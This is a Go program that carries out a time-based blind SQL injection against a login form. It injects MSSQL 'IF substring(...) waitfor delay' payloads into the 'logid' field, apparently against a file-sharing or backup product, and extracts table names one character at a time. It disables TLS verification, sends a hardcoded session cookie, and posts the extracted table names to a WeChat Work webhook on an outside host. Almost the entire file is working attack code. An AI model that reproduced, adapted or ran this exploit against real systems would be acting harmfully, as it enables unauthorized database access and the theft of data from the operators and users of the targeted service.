package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"time"
)

var table string
var huan = false

func main() {
	for i := 0; i < 3; i++ {
		huan = false
		table = ""
		fmt.Print(i)
		fmt.Print(" : ")
		start()
		ok(table)
	}
}

func start() {

	var payloads = [...]string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "_", "=", "+"}

	for i := 1; i < 25; i++ {
		if huan == false {
			for _, value := range payloads {
				Httpget(value, strconv.Itoa(i))
			}
		} else {
			break
		}
	}

	fmt.Println("")
}
func Httpget(payload string, i string) {

	url := "https://"
	cli := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	time_start := time.Now()
	req, err := http.NewRequest("POST", url, strings.NewReader(`guest=false&logid=admin'IF(substring((SELECT TOP 1 table_name FROM information_schema.tables where table_name != 'global_config' and table_name != 'admin_sub_category' and table_name != 'group_info' and table_name != 'group_tree' and table_name != 'backup_user_menu' and table_name != 'history_bandwidth' and table_name != 'history_filteu' and table_name != 'history_filter' and table_name != 'history_resource' and table_name != 'history_rule' and table_name != 'history_share_menu' and table_name != 'import_user_info' and table_name != 'log_action' and table_name != 'history_backup_menu' and table_name != 'log_backup' and table_name != 'file_link_info' and table_name != 'log_backup_details' and table_name != 'log_backup_result' and table_name != 'log_del_backup' and table_name != 'log_del_share' and table_name != 'log_download' and table_name != 'log_file_link_info' and table_name != 'log_download_details' and table_name != 'log_download_result' and table_name != 'log_main' and table_name != 'log_restore' and table_name != 'log_restore_details' and table_name != 'mail_info' and table_name != 'log_restore_result' and table_name != 'log_upload' and table_name != 'log_upload_details' and table_name != 'log_upload_result' and table_name != 'notice_info' and table_name != 'org_info' and table_name != 'pwd_policy' and table_name != 'log_user_pwd' and table_name != 'schedue_detals' and table_name != 'ashdle_eails' and table_name != 'schdue_etails' and table_name != 'chedul_tails' and table_name != 'schedule_details' and table_name != 'schedule_info' and table_name != 'server_info' and table_name != 'log_mail_info' and table_name != 'share_acl_info' and table_name != 'share_file_info' and table_name != 'share_guest_info' and table_name != 'share_lock_info' and table_name != 'multisession_check' and table_name != 'share_node_info' and table_name != 'share_pub_info' and table_name != 'new_file_info' and table_name != 'share_sub_info' and table_name != 'share_user_menu' and table_name != 'policy_speed_limit' and table_name != 'storage_info'),`+i+`,1) ='`+payload+`') waitfor delay'0:0:2'--&pwd=ugKoBSdM6GKIki0Zuv8=`))

	if err != nil {
		fmt.Println(err)
	}

	req.Header.Add("Cookie", "PHPSESSID=44038bbbamf8h1kc017hr7ra61")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Add("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3")
	req.Header.Add("Dnt", "1")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Connection", "close")

	do, err := cli.Do(req)
	if err != nil {
		fmt.Println(err)
	}
	defer func() {
		_ = do.Body.Close()
	}()
	all, _ := ioutil.ReadAll(do.Body)
	html := string(all)
	if do.StatusCode == 200 && strings.Contains(html, "alert") {
		//fmt.Print(i + "  : " + payload + " :  ")
		//fmt.Println(time.Since(time_start).Nanoseconds())
		if time.Since(time_start).Nanoseconds() > 8000000000 && time.Since(time_start).Nanoseconds() < 9000000000 {
			if payload != `+` {
				fmt.Print(payload)
				table = table + payload
			} else {
				huan = true
			}
		}

	}
}

func ok(table string) {
	var req *http.Request
	post := `{
        "msgtype": "text",
        "text": {
            "content": "注入完成表名 : ` + table + `"
        }
   }`
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	req, _ = http.NewRequest("POST", "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=", strings.NewReader(post))
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}
